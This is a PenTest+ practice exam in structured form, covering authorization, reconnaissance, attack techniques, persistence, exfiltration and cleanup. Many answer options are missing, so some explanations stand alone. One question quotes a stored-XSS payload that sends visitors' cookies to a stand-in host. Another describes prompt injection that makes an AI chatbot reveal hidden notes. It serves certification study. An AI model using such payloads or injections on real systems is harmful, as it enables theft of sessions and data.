title: PenTest+ V3 (PT0-003) practice exam
note: Original questions written for MyNextCert from the public PT0-003 exam objectives. Not real exam questions. Practice these skills only on systems you own or have written permission to test.

q.q: A tester is hired to test a sector's web portal. Before any scanning starts, what must the tester have?
o: Credentials may or may not be provided; authorization is required either way.
A verbal OK from the unit's help desk supervisor on the phone
Verbal approval from someone without authority isn't enough.
A list of the portal's open ports
That comes from testing, not before it.
Signed written authorization that defines the scope
Right. Testing without written permission can be illegal, and the scope says exactly what may be touched.

q.q: A pen test company and a unit sign one long-term contract with general terms, then a short document for each test that lists its targets, dates and deliverables. What is the per-test document?
o: An SLA sets service performance targets.
Right. An SOW covers one engagement's specifics under the master agreement.
The MSA is the long-term contract with general terms.

q.q: During an authorized test, the tester finds a server at 10.20.5.9 that looks easy to break into, but it isn't on the scope list. What should the tester do?
o: Test it quickly, since it's on the same network
Being on the same network doesn't put it in scope.
Delete it from the network map
Stop and ask the client before touching it
Right. Out-of-scope systems need written approval first, even if they look tempting.
Test it and mention it in the report
Reporting it after testing doesn't make the testing authorized.

q.q: The rules of engagement say testing may only run from 1800 to 0600 and that denial-of-service attacks are banned. What is this document for?
o: Setting the price and the payment schedule for the test
Pricing belongs in the contract or SOW.
Setting how, when and what the testers may test
Right. Rules of engagement set limits on timing, methods and conduct.

q.q: Mid-test, the tester finds evidence that a real attacker is already inside the client's network. What should the tester do?
o: Post a warning on social media
Try to lock out the attacker's accounts and remove their tools yourself
That's the client's incident response, not the tester's job.
Keep testing and include it in the final report
A live attacker needs action now, not in weeks.
Stop and contact the client's emergency point of contact right away
Right. Signs of a real compromise are a critical finding that triggers the escalation path in the ROE.

q.q: The tester finds a critical, easily exploited flaw in the unit's VPN two days into a three-week test. What is the best practice?
o: Exploit it further to see how far it goes
Going beyond the ROE isn't allowed, and the client needs to know now.
Wait for the final report so all findings stay together in one place
Waiting leaves the client exposed for weeks.
Report it to the client right away, not just at the end
Right. Critical findings are escalated immediately so the client can act.

q.q: Before the report goes out, a second tester reads through the findings and checks the evidence for each one. What is this?
o: That changes what the test focuses on.
Scope creep is work growing beyond the agreed scope.
Right. Peer review catches errors and false positives before the client sees them.
Scanning finds issues; peer review checks them.

q.q: Halfway through, the client asks the testers to drop the wireless testing and spend that time on the new HR web app. What is this?
o: Only the documented change is authorized.
Goal reprioritization, which should be agreed in writing
Right. Changes to goals are fine when the client agrees and the change is documented.
Scope creep, which the tester should refuse no matter what
The client can change priorities if it's agreed and documented.
A reason to cancel the test
Changing priorities doesn't end the engagement.

q.q: A team wants a public list of the most critical web application security risks to guide its web app testing. Which resource fits?
o: Right. The OWASP Top 10 lists the most critical web app risks.

q.q: Which framework catalogs real adversary tactics and techniques, which testers can use to plan and describe their attack steps?
o: PCI DSS is a payment card standard.
DREAD rates threats by damage, reproducibility and so on.
OCTAVE is a risk assessment method.
Right. ATT&CK maps real attacker behavior and is often used to plan and report tests.

q.q: A threat model rates each threat by Damage, Reproducibility, Exploitability, Affected users and Discoverability. Which model is this?
o: OCTAVE is an organizational risk method.
Right. DREAD scores threats on those five factors.
STRIDE classifies threat types like spoofing and tampering.

q.q: A tester assessing a port's crane control network needs a model that shows how ICS networks are split into levels, from field devices up to business systems. Which fits?
o: Right. Purdue describes ICS network levels and where zones and boundaries should be.
STRIDE classifies threats, not network levels.

q.q: Which section of a pen test report is written for leaders, in plain language, with overall risk and key recommendations?
o: Raw output is for technical readers.
Methodology explains how testing was done.
Right. Leaders read the executive summary, not the technical details.

q.q: A report explains step by step how testers chained a phishing click, a weak service account and a misconfigured share to reach payroll data. Which part is this?
o: The cover page only identifies the report.
Limitations note what couldn't be tested.
Right. The narrative tells the story of how findings combined into real impact.

q.q: A report notes that the mainframe wasn't tested because the client excluded it, and that testing ran for only five days. Which section holds this?
o: Right. Readers need to know what wasn't covered so they don't assume it's secure.
The executive summary, under overall risk
Limitations may be mentioned there, but they belong in their own section.

q.q: Each finding in the report gets a rating such as Critical, High or Medium, based on likelihood and impact. What does this help the client do?
o: Right. Risk scoring helps clients prioritize remediation.
Scores guide fixes; they don't replace them.

q.q: Testers cracked many weak passwords offline from captured hashes. Which recommendation best fixes the root cause?
o: Hide the password hashes behind a firewall
The hashes still exist and can still be stolen.
Make every user change their password once after the test
A one-time reset doesn't fix weak password rules.
Enforce long passphrases, MFA and checks against breached passwords
Right. Stronger passwords plus MFA address why the cracking and the reuse worked.
Turn off password expiration and change nothing else
That alone doesn't make passwords stronger.

q.q: Testers found SQL injection in a records app's search box. Which fix addresses the cause, not just the symptom?
o: Moving the database to another server
The vulnerable code stays the same.
A WAF rule blocking single quotes
A WAF helps, but attackers can often bypass it.
Parameterized queries in the app code
Right. Parameterized queries keep input as data so it can't change the SQL.
That hides the flaw but doesn't fix it.

q.q: Testers walked into a server room by following an employee through a badge door. Which recommendation is a physical control?
o: That's a technical control for wireless.
Right. A vestibule lets only one person through at a time.

q.q: Testers moved laterally because every workstation shared the same local admin password. Which fix fits best?
o: Renaming doesn't change the shared password problem.
Unique, rotated local admin passwords (such as LAPS)
Right. Unique local admin passwords stop one cracked password from opening every PC.
A longer, more complex shared local admin password on every PC
A shared password still unlocks every machine once it's cracked.

q.q: Before touching any client system, a tester reviews the unit's job postings, which list its firewall vendor and SIEM product. What kind of recon is this?
o: Sniffing captures traffic on a network.
Banner grabbing connects to a service.
Right. Public sources reveal technology details without interacting with the target.
No probes are sent to the target.

q.q: A tester searches certificate transparency logs for the client's domain. What are they most likely to find?
o: The internal IP address plan for the client's server subnets
Certificates usually name hosts, not internal addresses.
Subdomains that have had TLS certificates issued
Right. CT logs list issued certificates, which often reveal forgotten subdomains.
CT logs hold certificates, not passwords.

q.q: A tester connects to port 21 on an in-scope host and the service replies "220 vsFTPd 2.3.4." What technique is this?
o: Connecting to the host is active.
Right. Reading a service's greeting reveals its software and version.

q.q: A tester finds an old version of the client's website in the Wayback Machine that lists a former admin portal URL. Why is this useful?
o: Old pages can reveal paths and info that still work
Right. Archived pages often expose forgotten portals, emails or files.
It proves the current site is secure
It proves nothing about the current site.
Viewing an archive doesn't touch the target.
It gives the tester admin access

q.q: On an authorized internal test, a tester runs Wireshark on a switch port and sees only their own traffic and broadcasts. Why?
o: Switches forward unicast traffic only to the destination port
Right. On a switch, you need a mirror port or an on-path position to see other hosts' traffic.
Wireshark captures all protocols it can see.
The tester's NIC is too fast
NIC speed doesn't limit what's forwarded to the port.
Wireshark needs admin rights to see other hosts' traffic
Admin rights let it capture on the NIC, but the switch still doesn't send it other hosts' unicast traffic.

q.q: A tester asks a client's DNS server for a full copy of the zone and gets every host record back. What does this show?
o: The server allows zone transfers to anyone
Right. AXFR should be limited to secondary DNS servers; an open transfer maps the network for attackers.
Zone transfers to unknown hosts shouldn't be allowed.
DNSSEC is enabled and signing every record
DNSSEC signs records; it doesn't stop zone transfers.

q.q: A tester runs a tool that tries thousands of common folder names against a web server and finds /backup/ and /old-admin/. What is this?
o: Banner grabbing of the web server's HTTP headers
Right. Tools like Gobuster find hidden content by trying common names.
Sending thousands of requests is active.

q.q: On an authorized internal test, a tester lists SMB shares on a file server without credentials and finds a readable share named IT_Scripts. Why does this matter?
o: SMB settings vary; openness is the issue here.
Shares can never contain sensitive data
Scripts often hold hard-coded credentials or secrets
Right. Open shares are a common place to find passwords and keys.
It proves the server is patched
Share access says nothing about patching.

q.q: A tester queries Active Directory with a low-privileged account and maps which users can reach the domain admins through group memberships and sessions. What is the tester enumerating?
o: Right. Tools such as BloodHound map how a regular user could reach high privileges.
Open TCP ports on the domain controllers

q.q: An Nmap scan reports "OS details: Linux 5.4 - 5.15" for a host. How did Nmap work this out?
o: By logging into the host with the tester's domain credentials
Nmap doesn't need credentials for OS detection.
By fingerprinting how the host's TCP/IP stack responds
Right. OS detection compares response quirks against known fingerprints.
Nmap doesn't query AD for this.
By reading the host's DNS name
Names don't reveal the OS reliably.

q.q: A Bash recon script runs: for ip in $(seq 1 254); do ping -c1 -W1 10.0.0.$ip | grep "bytes from"; done. What does it do?
o: Pings each address in 10.0.0.1-254 and shows the ones that reply
Right. It's a simple ping sweep looping over the subnet.
Scans ports 1 to 254 on 10.0.0.1 and lists the open ones
It pings 254 addresses; it doesn't scan ports.

q.q: A Python recon script works, but the client wants the scan limited to ports 22, 80 and 443. The script has a line: ports = range(1, 1025). What change does this?
o: Right. A list of exactly the allowed ports keeps the scan in scope.
That's a string, so the loop would go over characters, not ports.
That scans every port from 22 to 442.

q.q: A PowerShell line reads: Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)}. What does it list?
o: Users who haven't logged on in the last 90 days
Right. Stale accounts are useful targets because nobody notices their use.
Users who will log on within 90 days
Users created in the last 90 days
The filter checks last logon, not creation.

q.q: A recon script must try each subdomain from a word list but skip any line that starts with #. Which logic fits in Python?
o: That loops forever on a comment line; pass doesn't move on.
That only matches a line that is exactly #, and quits the script.
Right. continue skips the rest of the loop for comment lines.
break stops the whole loop at the first comment.

q.q: A tester wants to find the client's internet-facing devices, like webcams and VPNs, using a search engine that indexes service banners, without scanning anything. Which tool fits?
o: Right. Shodan indexes internet-facing services and their banners.
Responder captures credentials on a local network.

q.q: Which Nmap option runs service and version detection on open ports?
o: -sn does host discovery with no port scan.
-Pn skips host discovery and treats hosts as up.
Right. -sV probes open ports to identify the service and version.
-oN saves normal output to a file.

q.q: A tester needs email addresses, names and subdomains for a client from public sources like search engines. Which tool is built for this?
o: Right. theHarvester gathers emails, names and hosts from public sources.
Mimikatz extracts credentials from Windows memory.

q.q: Which tool can visually map relationships between a client's people, domains, emails and infrastructure from OSINT?
o: Right. Maltego builds link graphs from public data.
Nikto scans web servers for known issues.

q.q: An authorized wireless test needs to put a Wi-Fi card in monitor mode and capture WPA2 handshakes. Which tool suite fits?
o: Right. The Aircrack-ng suite handles monitor mode, capture and WPA testing.

q.q: Which Nmap feature lets a tester run scripts, such as checking SMB for known vulnerabilities, during a scan?
o: Right. NSE scripts extend Nmap with discovery and vulnerability checks.
That draws a map of results.

q.q: A tester wants to list subdomains of the client's domain by combining many passive sources, such as certificate logs and DNS datasets. Which tool fits?
o: Right. Amass maps attack surface and subdomains from many sources.
Responder poisons name resolution on a LAN.

q.q: A scan without credentials shows few findings on in-scope Windows servers. The client allows a scan with a test account. What does the credentialed scan add?
o: It makes the scan invisible to EDR
It can check installed patches and local settings
Right. Logged-in scans see what's installed and configured, not just what's exposed.
It removes every false positive from the results automatically
It reduces some, but findings still need validation.
It tests only the web apps

q.q: The client wants its app's source code checked for flaws without running the app. Which technique fits?
o: Right. SAST analyzes code at rest.

q.q: A tester scans a code repository and finds an AWS access key committed two years ago. Which kind of scan found it?
o: Right. Secrets scanners look for keys, tokens and passwords in code and history.
Container scanners check images for vulnerable packages.

q.q: The client's app depends on dozens of open-source libraries. Which technique finds known CVEs in those dependencies?
o: Right. SCA inventories dependencies and matches them to known vulnerabilities.
Static analysis of the client's own code only
SAST focuses on the code the client wrote.

q.q: On an authorized ICS assessment, the tester must find vulnerabilities on fragile PLCs that crash under normal scans. What approach fits?
o: That risks safety and is usually banned in the ROE.
Skip the PLCs and report them as secure
Fast full-port Nmap scans with -T5, run during the night shift
Fast, heavy scans can crash fragile devices at any hour.
Passive analysis of traffic and careful, approved low-impact checks
Right. ICS testing favors passive methods so production isn't disrupted.

q.q: A tester scans a container image before it's deployed and finds an old OpenSSL package with known CVEs. What type of scan is this?
o: DAST tests the running app's behavior.
Right. Image scanners check the packages inside containers.

q.q: A scanner flags Apache 2.4.49 path traversal on a server. The tester checks and finds the server runs nginx with no Apache installed. What is the finding?
o: Right. The reported flaw isn't present, so remove it after documenting why.
A false negative is a real flaw that was missed.
Nothing here is an unknown flaw.

q.q: A scan report shows zero findings for a /24 subnet. The tester sees the scan stopped after 12 minutes because the scanner lost its connection. What should the tester do?
o: Report the subnet as secure, since no findings came back
Treat the subnet as not tested and rerun the scan
Right. Check scan completeness before trusting a clean result.
There's no evidence for that either.
Scope isn't the tester's to change.

q.q: A scan says a host runs a vulnerable SMB version. The tester wants to confirm it in a safe way that fits the ROE. What should they do?
o: Launch the most damaging exploit to be sure
Ask the help desk if it's vulnerable
Trust the scanner and skip validation
Validate with a non-destructive check before any exploit
Right. Confirm findings safely and stay inside the rules of engagement.

q.q: A tester finds a public exploit for a flaw on an in-scope server. Before running it, what should they check?
o: What the exploit code actually does
Right. Public exploits can be unreliable, destructive or even malicious; read and test them first.
Public code can still harm the client or the tester.
Only the number of stars on its repository

q.q: Two scans of the same host disagree: one shows port 445 open, the other shows it filtered. What is the best next step?
o: Report the open result, since it's worse
Report what's confirmed, not the scariest result.
Rescan or test the port directly to confirm
Right. Conflicting results need validation before they're reported.
Report the filtered result, since it's better
Pick based on evidence, not preference.
Remove the port from the report
It may matter; confirm it first.

q.q: Scan output lists 400 findings. Which should the tester look at first for exploitation planning?
o: Findings with known public exploits on exposed, in-scope hosts
Right. Exploitability and exposure help pick the most valuable targets.
Every Informational finding first, since there are the most of them
Info findings rarely lead to access.
The oldest findings in the list
Age in the list doesn't equal risk.

q.q: On an authorized physical test, a tester carrying boxes follows an employee through a badge-controlled door. What technique is this?
o: Cloning copies a badge; here the tester used someone else's entry.
Right. The tester enters behind someone with valid access.

q.q: A tester uses a handheld reader to copy an employee's 125 kHz proximity badge from a short distance. What attack is this?
o: Right. Many low-frequency badges can be read and copied easily.

q.q: As part of an authorized test, branded USB drives with a harmless callback payload are left in the client's parking lot. What does this measure?
o: Whether staff plug in unknown media
Right. A USB drop tests user behavior and endpoint controls.
How complex the client's password rules are

q.q: Before a physical test, the tester walks around the site noting cameras, entrances, guard posts and smoking areas. What is this?
o: Right. A site survey gathers physical recon to plan the test.

q.q: Three in-scope findings: an EOL Windows Server 2012 with a public RCE exploit, a CVSS 5.3 information leak, and a self-signed certificate. Which target gives the best chance of access?
o: The end-of-life server with a public exploit
Right. Unsupported systems with working public exploits are the strongest leads.
It may help, but it rarely gives access by itself.
None, since all three are equal
They differ a lot in exploitability.

q.q: A finding has a high EPSS score and appears on CISA's Known Exploited Vulnerabilities list. What does that tell the tester?
o: Attackers are actively using it, so it's a priority
Right. Real-world exploitation makes a finding more urgent to test and report.
It's being exploited in the wild.
It's out of scope, since KEV entries belong to CISA to test
Scope depends on the client's targets, not who lists the CVE.
KEV listing means it's real and exploited.

q.q: The ROE ban any test that could crash production. A tester's planned exploit has a known chance of crashing the service. What should they do?
o: Run it late at night when fewer people would notice an outage
Get written approval or use a safer method
Right. Stay inside the ROE; risky actions need explicit client sign-off.
Run it and apologize if it crashes

q.q: Before launching attacks, a tester prepares a cleanup list of every account, file and change they'll make. Why?
o: So every change can be found and reverted afterward
Right. Tracking changes makes cleanup and restoration reliable.
Because the ROE ban taking notes
To hide the test from the client
The client should know what was changed.
To make the final report shorter and quicker to write
It's about cleanup and restoration, not report length.

q.q: On an authorized internal test, a tester uses ARP poisoning so traffic between a workstation and the gateway flows through the tester's machine. What attack is this?
o: VLAN hopping through a misconfigured trunk port
Right. ARP spoofing places the attacker between two hosts.

q.q: A tester sends frames with two 802.1Q tags from an access port, hoping a switch strips the first and forwards the frame into another VLAN. What is this?
o: MAC flooding fills the switch's CAM table.
Right. Double tagging abuses native VLAN handling to reach another VLAN.

q.q: On an authorized test, Responder answers LLMNR and NBT-NS name requests on the LAN and collects NTLMv2 hashes from users. What weakness made this possible?
o: Legacy name resolution protocols left enabled
Right. LLMNR and NetBIOS let any host answer name queries, so disabling them fixes this.
Disabled SMB signing on the DC only
Signing affects relaying, not who answers name queries.

q.q: A tester relays captured NTLM authentication to a file server and gets access as the victim. Which control on the server would block this?
o: Right. Required signing stops relayed NTLM sessions from being accepted.

q.q: With a captured NTLM hash and no plaintext password, a tester logs in to another host as that user. What is this?
o: Kerberoasting cracks service ticket hashes offline.
Right. NTLM accepts the hash itself, so cracking isn't needed.

q.q: A tester with a normal domain account requests service tickets for accounts with SPNs, then cracks them offline to recover service account passwords. What is this?
o: Right. Service tickets are encrypted with the service account's password hash, so weak passwords can be cracked.
That captures hashes from name requests.
That forges tickets with the krbtgt hash.
That reuses a stolen ticket without cracking.

q.q: During an authorized social engineering test, the tester sends repeated MFA push requests to a user's phone at 0200 until the user approves one. What is this?
o: SIM swapping moves a phone number to an attacker's SIM.
Right. Repeated prompts wear the user down until they approve one.
That forces a known session ID.

q.q: A tester tries Spring2026! against all 600 domain accounts, once each, staying under the lockout limit. What is this?
o: That's many passwords against one account.
Right. One password against many accounts avoids per-account lockouts.

q.q: A Windows service path is C:\Program Files\Vendor App\svc.exe, with no quotes, and it runs as SYSTEM. The tester can write to C:\Program Files\Vendor\. What is the weakness?
o: Right. Windows may run C:\Program Files\Vendor.exe first, giving the tester's file SYSTEM rights.

q.q: On a Linux host, a tester finds /usr/bin/find has the SUID bit set and is owned by root. Why does this matter?
o: It means find is out of date
It may let the user run commands as root
Right. Some SUID binaries can spawn a shell with the owner's rights.
It's required for find to work
It blocks the tester from searching files

q.q: With admin rights on an in-scope Windows host, a tester reads LSASS memory to get credentials of users who logged on there. What is this?
o: A shell escape breaks out of a restricted shell.
Right. LSASS holds credential material for logged-on users.

q.q: A tester is stuck in a restricted shell on a kiosk but finds the allowed text editor can run system commands. What is this?
o: That targets a website victims visit.
Right. Using an allowed program to run commands breaks out of the restriction.

q.q: A tester changes the URL /api/orders/1043 to /api/orders/1044 and sees another user's order. What is the flaw?
o: Clickjacking hides a page under another.
CSRF makes a user's browser send a request; here the tester just changed an ID.
Right. The app doesn't check that the object belongs to the user.

q.q: A web app fetches any URL a user supplies. The tester submits http://169.254.169.254/latest/meta-data/ and gets the cloud server's metadata back. What attack is this?
o: Cross-site request forgery (CSRF) against the app
CSRF tricks a user's browser into sending requests.
Right. The server makes requests for the attacker, including to internal-only addresses.

q.q: A comment form saves the input <script>fetch('//x.example/?c='+document.cookie)</script>, and it runs in every visitor's browser. What type of attack is this?
o: Reflected XSS isn't saved; it bounces back in one response.
No OS command is run on the server.
Right. The script is saved on the server and runs for everyone who views it.

q.q: A tester changes a JWT's header to "alg":"none", removes the signature, sets "role":"admin" and the app accepts it. What is the flaw?
o: The token's expiry time is set too far into the future
Long expiry is a weakness, but the forged token worked because the signature wasn't checked.
The app doesn't verify the token's signature properly
Right. Tokens must be validated with an expected algorithm and key.

q.q: On an authorized cloud test, a tester finds a storage bucket that anyone on the internet can list and read. What kind of weakness is this?
o: A zero-day in the cloud provider
Right. Public read on sensitive storage is a common cloud misconfiguration.

q.q: A tester gets temporary credentials for an IAM role from a compromised VM and finds the role can create new admin users. What should the report stress?
o: Right. Least privilege on roles limits what a compromised workload can do.
The VM's missing operating system patches and old kernel
Patching matters, but the big risk here is the role's excess permissions.

q.q: A tester inside a container finds the Docker socket mounted and uses it to start a privileged container with the host's file system. What attack is this?
o: Right. Access to the Docker socket gives control of the host.

q.q: A test shows that the cloud instance metadata service answers any request from the web app server without a session token. Which setting would make SSRF theft of credentials harder?
o: Turn off HTTPS on the app
Give the instance role more permissions so tokens aren't needed
That raises the impact of theft.
Require session tokens for metadata (such as IMDSv2)
Right. Token-based metadata access blocks simple SSRF requests.

q.q: On an authorized wireless test, the tester sets up an access point with the same SSID as the client's guest network and a stronger signal. What attack is this?
o: That scans phone lines for modems.
Right. Clients may connect to the fake AP and send traffic through it.

q.q: Why would a tester send deauthentication frames to a client during an authorized WPA2-Personal test?
o: To force a reconnect and capture the 4-way handshake
Right. The captured handshake can then be cracked offline if the passphrase is weak.
To read the AP's admin password directly
It captures a handshake, not the admin password.
To install a new firmware on the AP

q.q: A router has WPS PIN mode enabled. Why is this a finding?
o: WPS turns off WPA2 encryption for every connected client
WPS doesn't remove encryption; its PIN is the weak point.
The 8-digit PIN can be brute-forced in two halves
Right. WPS checks the PIN in halves, so far fewer guesses are needed.

q.q: A guest network sends users to a web page to accept terms before getting online. During testing, the tester copies an allowed device's MAC address and skips the page. What weakness is this?
o: A captive portal that trusts MAC addresses
Right. MAC addresses are easy to spoof, so they're weak proof of authorization.
An evil twin access point using the same SSID

q.q: As part of an authorized test, the tester calls staff pretending to be from the help desk and asks them to read out a one-time code. What is this?
o: Right. Social engineering by phone call.
Whaling targets senior leaders, usually by email.

q.q: An authorized phishing campaign sends users to a cloned login page that records what they type. What is this tactic?
o: That compromises a site victims visit.
Right. A fake login page collects usernames and passwords.

q.q: The scope includes infecting a website that the client's engineers often visit, so the test reaches them there. What attack is this?
o: Right. The attacker compromises a site the targets already trust and visit.

q.q: Which tool is commonly used to build and track an authorized phishing campaign, including landing pages and click results?
o: Right. Gophish runs phishing simulations and tracks results.

q.q: During an authorized test of an AI support chatbot, the tester types instructions that make it ignore its system prompt and reveal internal notes. What is this?
o: That tries to recover training data.
Right. Crafted input overrides the model's intended instructions.

q.q: A tester reads data from a phone over Bluetooth without the owner pairing or approving it. What attack is this?
o: Right. Bluesnarfing steals data over Bluetooth without permission.
That reads NFC at a few centimeters.

q.q: On an OT assessment, the tester finds Modbus traffic with no authentication. What risk does this create?
o: Modbus has nothing to do with Wi-Fi.
Passwords are sent in clear text over Modbus
The bigger issue is that Modbus has no authentication at all.
Anyone on that network can send commands to devices
Right. Many ICS protocols lack authentication, so network access means control.

q.q: A tester reviews a mobile app and finds an API key stored in plain text in the app package. Which standard covers mobile app security checks like this?
o: Right. MASVS defines security requirements for mobile apps.
PCI DSS covers card data environments.

q.q: A tester writes a Python loop that tries each password from a short approved list against one test account's login form, with a pause between tries. What is the pause for?
o: To stay under lockout limits and avoid disrupting service
Right. Throttling keeps automated testing inside the ROE.
To make the script's traffic look like a real user logging in
Blending in isn't the goal; staying within lockout limits and the ROE is.

q.q: Which PowerShell command lets a tester run a command on a remote Windows host over WinRM, with valid credentials?
o: Right. Invoke-Command runs script blocks on remote hosts through WinRM.
That checks if a path exists.

q.q: The client wants to repeatedly test whether its EDR detects common attacker techniques, using safe scripted simulations. Which tool type fits?
o: A port scanner with service detection
Right. BAS tools such as Caldera or Atomic Red Team run safe technique tests.
That edits files byte by byte.

q.q: A Bash one-liner reads: cat users.txt | while read u; do echo "$u@unit.example"; done > emails.txt. What does it produce?
o: A list of email addresses built from the usernames
Right. It appends the domain to each username and saves the list.
An email message sent to every username in the file
echo only prints text; nothing is sent.

q.q: During an authorized test, the tester creates a scheduled task that runs their implant at every logon. What is the goal?
o: Right. Persistence keeps access across reboots and logons.

q.q: On a Linux web server, the tester adds a line to a user's crontab that calls back to the C2 server every 10 minutes. What technique is this?
o: Right. Cron runs the callback on a schedule, keeping access.

q.q: A tester uploads a small PHP file to a web server that runs commands passed in a URL parameter. What is it?
o: Right. A web shell gives command access through the web server.

q.q: Why should every persistence mechanism a tester adds be recorded with its location and time?
o: So it can be removed during cleanup
Right. Anything left behind could be used by a real attacker.
Because the ROE require hiding it from the SOC
So it can be sold later
That would be unethical and illegal.
So the client can't find it

q.q: From a compromised workstation, the tester reaches a server subnet they can't route to directly by sending traffic through the workstation. What is this?
o: Right. The compromised host becomes a relay into networks the tester couldn't reach.
Persistence keeps access on one host.

q.q: With stolen admin credentials, a tester runs commands on a file server using PsExec over SMB. Which phase is this?
o: Right. The tester is moving from one host to another.

q.q: A tester uses SSH local port forwarding (ssh -L 8080:10.10.5.20:80 user@jump) during an authorized test. What does this do?
o: It forwards traffic; it doesn't block it.
Copies files from the jump host
Opens port 8080 on 10.10.5.20 so anyone on the internet can reach it
It doesn't change the target's ports.
Sends the tester's local port 8080 through the jump host to 10.10.5.20:80
Right. Traffic to localhost:8080 is tunneled to the internal web server.

q.q: Which detection would most likely catch lateral movement through WMI and WinRM in a domain?
o: Antivirus signature update logs on the domain controller
Signature updates don't show remote logons or remote process starts.
Firewall logs of inbound internet traffic to the DMZ only
Lateral movement is internal; DMZ inbound logs miss it.
Logs of unusual remote logons and remote process creation
Right. Remote execution leaves logon and process events that defenders can watch for.

q.q: A tester proves data could leave the network by encoding small chunks into DNS queries to a domain they control. What is this?
o: A DNS zone transfer from the client's server
That copies DNS records from a server.
Right. DNS queries are often allowed out, so they can hide data.

q.q: Before an approved exfiltration test, the tester compresses and encrypts the sample files. Why encrypt them?
o: DLP is the client's control, not the reason.
Encryption doesn't aim to grow files.
To keep the client's SOC from noticing the exfiltration test at all
The point is protecting the client's data, not hiding from them.
To protect the client's data while it's in transit and stored
Right. Testers must protect client data they handle.

q.q: The ROE allow testing exfiltration but limit it to dummy files the client provides. Why use dummy data?
o: It proves the path works without exposing real sensitive data
Right. The goal is to show data could leave, not to take real records.
Real data is too small to test with
Dummy files can't be flagged by the client's DLP, so it's quieter
The point isn't to avoid detection; it's to avoid exposing real data.
It keeps the test safe and lawful.

q.q: Before exfiltrating, a tester gathers all the target files into one folder on a compromised host. What is this step called?
o: Pivoting relays traffic to other networks.
Right. Staging collects data in one place before moving it out.

q.q: Testing is over. What should the tester do with the test accounts, web shells and scheduled tasks they created?
o: Leave them for the next test
Leftover access is a serious risk.
Disable them but leave them in place
Hand them to the help desk
Remove them and confirm they're gone
Right. Cleanup returns systems to their original state so nothing is left for real attackers.

q.q: During cleanup, the tester finds one change they can't undo themselves, a modified registry setting on a production server. What should they do?
o: Tell the client and document it so they can revert it
Right. Anything not cleaned up must be reported.
Reimage the server so it's back to a clean known state
That's far beyond the tester's role and could break production.

q.q: Why should testers keep their own logs and screenshots after cleanup, under the agreed retention rules?
o: They prove what was done and support the report's findings
Right. Artifacts back up the report and protect both sides.
Because logs are required to stay on client servers
To use the client's data later for training
Client data must be handled under the agreement only.

q.q: After cleanup, how can the tester confirm all persistence was removed?
o: Check each item on the change log and verify it's gone
Right. Use the record of every change to confirm removal.
Reboot each host and assume the reboot removed everything
Ask the user if they noticed anything

q.title: Read directory-enumeration results
q.scenario: On a signed web application test, you ran a wordlist-based directory enumeration (gobuster-style) against the client's staging site. Mark every line that is a real finding worth reporting.
q.ticket: ENG-2310: target https://staging.client-example.test only, enumeration allowed, no exploitation.

lines.why: The site's normal home page. A 200 on a page that is meant to be public is not a finding.
A login page is expected and meant to be reachable. It is a place to test later, not a finding by itself.
A 302 redirect to the login page means the admin area asks for authentication. That is the right behavior.
A 403 means the server refused the request. Access control is working, so this is not a finding.
A readable .git folder on a web server can expose the application's source code and history, and sometimes passwords left in it. It is a real information-disclosure finding.
A downloadable 18 MB archive named backup in the web root is likely a copy of the site or its data. It is a real finding, and you report it without opening it.
A 301 just adds a trailing slash to a folder name. By itself it shows the folder exists, not that anything is exposed.

A .bak copy of a config file is usually served as plain text because the server does not run .bak files as PHP. Its 1604-byte size shows content came back. Config files often hold database passwords, so this is a real finding.
A normal folder for site pictures. Its existence is not a finding.

ask.label: Which finding type best fits the lines you marked?
opts: Sensitive files exposed in the web root
Server status page exposed to the internet
ask.why: A readable .git folder, a backup archive and a copied config file are all things that should never be reachable on a web server. Together they are sensitive information disclosure. The 302 and 403 lines show access control working, and nothing here names a server version or an SSRF flaw.

q.title: Order the steps for a critical finding mid-test
q.scenario: On day two of a signed five-day test, you find a critical flaw on an in-scope server that exposes a database with personal records. The rules of engagement name a client contact and an escalation path. Build the steps in the order they should happen. Some ideas do not belong.
q.ticket: ENG-2288: critical finding on day 2. RoE lists the client security lead as the escalation contact.

rules.text: Stop testing that path and write down what you saw, with times
rules.why: Stopping avoids more impact on a system holding personal data, and notes made right away give the client accurate evidence.

rules.text: Notify the client security lead through the agreed escalation path
rules.why: The rules of engagement name who to tell. A critical flaw should not wait for the final report.

rules.text: Share the details only over the agreed secure channel
rules.why: Details of an open critical flaw are sensitive. Sending them over an unapproved channel could leak them.

rules.text: Agree with the client on whether and how to continue testing
rules.why: Continuing may change the plan, the timing or the allowed actions. The client decides, in writing, before you go on.

rules.text: Add the finding to the final report with risk rating and fix advice
rules.why: The report is the permanent record. It is written once the engagement work is done.

rules.text: Pull the personal records out to prove the impact
rules.why: Copying personal data goes beyond the signed scope and creates a privacy problem. Showing that access is possible is enough.

rules.text: Email the full details to the client's IT distribution list so everyone can start fixing it
rules.why: Wide or unapproved channels can leak details of an open critical flaw. Use only the named contact and the agreed secure channel.

before.why: Stop and record first, so what you tell the client is accurate and you cause no more impact.
The client has to know about the flaw before it can decide how testing continues.

last.why: The report is written after the work is done and the client has agreed how to proceed, so it sits at the bottom.

q.title: Place devices on the Purdue model
q.scenario: You are mapping a signed OT (operational technology, the systems that run physical equipment) test for a water treatment plant using the Purdue model, which splits a plant network into levels. Place each device on its level. Two items in the tray do not belong on this map.

devs.name: Industrial DMZ jump host
devs.why: Level 3.5 is the industrial DMZ. A jump host there is the controlled entry point between the corporate network and the plant.

devs.name: Data historian server
devs.why: Historians collect plant-wide data and live at Level 3, site operations.

devs.name: Operator HMI workstation
devs.why: A human-machine interface (HMI) is the operator screen for an area, which is Level 2 supervisory control.

devs.name: PLC for pump control
devs.why: A programmable logic controller (PLC) runs the control logic and talks directly to field devices. That is Level 1.

devs.name: Flow sensor
devs.why: Sensors and actuators are the physical process itself, which is Level 0.

devs.name: ERP planning server
devs.why: Business systems such as ERP and Active Directory sit at Levels 4-5 (enterprise), above the industrial DMZ. They are not on a plant level of this map.

devs.name: Corporate AD server
devs.why: Business systems such as ERP and Active Directory sit at Levels 4-5 (enterprise), above the industrial DMZ. They are not on a plant level of this map.

q.title: Pick the items to clean up after the test
q.scenario: The signed test of a lab server is finished. Below is your own activity log. Mark each line that left something behind that you must remove or undo at cleanup.
q.ticket: ENG-2350: testing complete, cleanup due before the close-out meeting.

lines.text: 09:12 Ran a ping sweep and port scan of the approved range
lines.why: Scans only read information and leave nothing on the target that you have to remove. They stay in your notes as evidence.

lines.text: 10:05 Created local account 'tester_svc' on srv-lab-04 to keep access
lines.why: An account you created is persistence. It must be removed so it cannot be used by anyone else after the test.

